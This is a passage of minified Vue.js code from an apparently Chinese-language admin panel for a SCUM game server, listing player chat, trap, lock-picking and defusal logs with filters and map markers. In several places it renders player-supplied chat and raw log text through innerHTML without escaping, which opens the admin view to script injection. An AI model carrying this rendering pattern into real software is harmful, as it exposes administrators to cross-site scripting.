HH:mm:ss",value:[e.chatMessageListFilter.timestampStart,e.chatMessageListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.chatMessageListFilter,"timestampStart",t[0]),e.$set(e.chatMessageListFilter,"timestampEnd",t[1])}}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("过滤机器人消息:")]),i("a-switch",{staticStyle:{"margin-left":"10px"},model:{value:e.chatMessageListFilter.noRobot,callback:function(t){e.$set(e.chatMessageListFilter,"noRobot",t)},expression:"chatMessageListFilter.noRobot"}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.chatMessageListColumns,"data-source":e.chatMessageListData,expandedRowKeys:e.expandedChatMessageIds,"row-key":"id",pagination:!1,loading:e.loadingChatMessageListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedChatMessageIds.find((function(e){return e===i.id}))&&e.expandedChatMessageIds.push(i.id);else{var a=Object.keys(e.expandedChatMessageIds).find((function(t){return e.expandedChatMessageIds[t]===i.id}));void 0!==a&&e.expandedChatMessageIds.splice(a,1)}}},scopedSlots:e._u([{key:"content",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.expandedChatMessageIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.expandedChatMessageIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.expandedChatMessageIds.find((function(e){return e===a.id}))&&e.expandedChatMessageIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.chatMessageUser&&a.chatMessageUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.chatMessageUser.userName}})}}},[e._v("("+e._s(a.chatMessageUser.userName)+")")]):e._e()]}},{key:"type",fn:function(t){return[i("span",[e._v(e._s(e.chatMessageTypeKeyValue[t]?e.chatMessageTypeKeyValue[t]:t))])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"sessionId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"sendTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedChatMessageIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("消息内容")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.content)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.content.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.chatMessageListPagination.pageSize,current:e.chatMessageListPagination.pageNum,total:e.chatMessageListPagination.total},on:{change:e.onChangeChatMessageListPagination,showSizeChange:e.onShowSizeChangeChatMessageListPagination}})],1)])],1)}),[],!1,null,"7a84c425",null),Vt=Kt.exports,Xt={name:"Trap",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"操作类型",key:"action",dataIndex:"action",width:80,align:"center",scopedSlots:{customRender:"action"}},{title:"操作者Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作者游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"操作者坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"陷阱名称",key:"targetName",dataIndex:"targetName",width:200,align:"center",scopedSlots:{customRender:"targetName"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],actionList:[{value:"crafted",label:"制作",color:"cyan"},{value:"armed",label:"安装",color:"blue"},{value:"disarmed",label:"拆卸",color:"green"},{value:"triggered",label:"触发",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"trap"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"trap"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},Zt=Xt,Wt=Object(S.a)(Zt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"action",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.actionList.find((function(e){return e.value===a.otherConfig.action}))?e.actionList.find((function(e){return e.value===a.otherConfig.action})).color:"grey"}},[e._v(" "+e._s(void 0!==e.actionList.find((function(e){return e.value===a.otherConfig.action}))?e.actionList.find((function(e){return e.value===a.otherConfig.action})).label:a.otherConfig.action)+" ")])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"targetName",fn:function(t){return[i("span",[e._v(e._s(t||"无数据"))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("触发坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.createdLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.createdArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.createdLocations}})],1)]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"c3a80af6",null),Qt=Wt.exports,Jt={name:"LockPick",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"开锁人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"开锁人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"开锁人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"对象物品名称",key:"targetName",dataIndex:"targetName",width:200,align:"center",scopedSlots:{customRender:"targetName"}},{title:"锁类型",key:"lockType",dataIndex:"lockType",width:80,align:"center",scopedSlots:{customRender:"lockType"}},{title:"是否成功",key:"success",dataIndex:"success",width:80,align:"center",scopedSlots:{customRender:"success"}},{title:"开锁时长",key:"elapsedTime",dataIndex:"elapsedTime",width:100,align:"center",scopedSlots:{customRender:"elapsedTime"}},{title:"失败尝试次数",key:"failedAttempts",dataIndex:"failedAttempts",width:120,align:"center",scopedSlots:{customRender:"failedAttempts"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],lockTypeList:[{value:"veryeasy",label:"非常基础",color:"green"},{value:"basic",label:"基础",color:"green"},{value:"medium",label:"中等",color:"yellow"},{value:"advanced",label:"高级",color:"red"}],selectedRowKeys:[]}},mounted:function(){this.getGameAreaList(),this.getActionsList()},methods:{onActionsListCleanFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList(!0)}))},onActionsListFilter:function(){var e=this;this.actionsListPagination.pageNum=1,this.$nextTick((function(){e.getActionsList()}))},onChangeActionsListPagination:function(e){var t=this;this.actionsListPagination.pageNum=e,this.$nextTick((function(){t.getActionsList()}))},onShowSizeChangeActionsListPagination:function(e,t){var i=this;this.actionsListPagination.pageNum=1,this.actionsListPagination.pageSize=t,this.$nextTick((function(){i.getActionsList()}))},getActionsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.actionsListPagination,n=a.pageNum,r=a.pageSize,e?(t.actionsListFilter={steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r,type:"lockPick"}):(void 0!==(l=Object(A.cloneDeep)(t.actionsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r,type:"lockPick"},l)),t.loadingActionsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/actionsRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingActionsListTable=!1,200===c.status&&(t.actionsListPagination.total=c.data.count,t.actionsListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingActionsListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.actionsListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()}}},ei=Jt,ti=Object(S.a)(ei,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onActionsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.steamId,callback:function(t){e.$set(e.actionsListFilter,"steamId",t)},expression:"actionsListFilter.steamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("操作者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.actionsListFilter.scumId,callback:function(t){e.$set(e.actionsListFilter,"scumId",t)},expression:"actionsListFilter.scumId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("操作者所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.actionsListFilter.createdArea,callback:function(t){e.$set(e.actionsListFilter,"createdArea",t)},expression:"actionsListFilter.createdArea"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("记录时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.actionsListFilter.timestampStart,e.actionsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.actionsListFilter,"timestampStart",t[0]),e.$set(e.actionsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.actionsListColumns,"data-source":e.actionsListData,expandedRowKeys:e.expandedActionsIds,"row-key":"id",pagination:!1,loading:e.loadingActionsListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedActionsIds.find((function(e){return e===i.id}))&&e.expandedActionsIds.push(i.id);else{var a=Object.keys(e.expandedActionsIds).find((function(t){return e.expandedActionsIds[t]===i.id}));void 0!==a&&e.expandedActionsIds.splice(a,1)}}},scopedSlots:e._u([{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"scumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.actionsRecordUser&&a.actionsRecordUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.actionsRecordUser.userName}})}}},[e._v("("+e._s(a.actionsRecordUser.userName)+")")]):e._e()]}},{key:"locationsArea",fn:function(t,a){return[i("span",[e._v(e._s(a.createdLocations)+"("+e._s(a.createdArea)+")")])]}},{key:"targetName",fn:function(t){return[i("span",[e._v(e._s(t||"无数据"))])]}},{key:"lockType",fn:function(t,a){return[i("a-tag",{attrs:{color:void 0!==e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType}))?e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType})).color:"grey"}},[e._v(" "+e._s(void 0!==e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType}))?e.lockTypeList.find((function(e){return e.value===a.otherConfig.lockType})).label:a.otherConfig.lockType)+" ")])]}},{key:"success",fn:function(t,a){return[i("a-tag",{attrs:{color:a.otherConfig&&!0===a.otherConfig.success?"green":"red"}},[e._v(e._s(a.otherConfig&&!0===a.otherConfig.success?"成功":"失败"))])]}},{key:"elapsedTime",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"darkyellow"}},[e._v(e._s(a.otherConfig&&a.otherConfig.elapsedTime?a.otherConfig.elapsedTime:"--"))]),e._v("s")])]}},{key:"failedAttempts",fn:function(t,a){return[i("span",[i("strong",{staticStyle:{color:"red"}},[e._v(e._s(a.otherConfig&&a.otherConfig.failedAttempts?a.otherConfig.failedAttempts:"--"))]),e._v("次")])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedActionsIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig&&t.otherConfig.owner&&t.otherConfig.owner.scumId?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("物主信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.otherConfig.owner.scumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.otherConfig.owner.steamId||"无Steam ID")+")")])])]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("坐标信息详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("触发坐标(区域):")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.createdLocations)),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.createdArea)+")")])])]),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("地图标识")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{height:"150px",width:"180px","padding-left":"10px"}},[i("map-locations",{attrs:{width:180,height:150,locations:t.createdLocations}})],1)]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.actionsListPagination.pageSize,current:e.actionsListPagination.pageNum,total:e.actionsListPagination.total},on:{change:e.onChangeActionsListPagination,showSizeChange:e.onShowSizeChangeActionsListPagination}})],1)}),[],!1,null,"6c5955f5",null),ii=ti.exports,ai={name:"Defusal",components:{MapLocations:J},data:function(){return{moment:R.a,loadingActionsListTable:!1,actionsListFilter:{steamId:void 0,scumId:void 0,createdArea:void 0,targetName:void 0,timestampStart:void 0,timestampEnd:void 0},actionsListColumns:[{title:"操作人Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"操作人坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"投掷物名称",key:"targetName",dataIndex:"targetName",width:200,align:"center",scopedSlots:{customRender:"targetName"}},{title:"动作类型",key:"actionType",dataIndex:"actionType",width:80,align:"center",scopedSlots:{customRender:"actionType"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],actionsListData:[],actionsListPagination:{pageSize:20,pageNum:1,total:0},expandedActionsIds:[],gameArealList:[],actionTypeList:[{value:"Pin 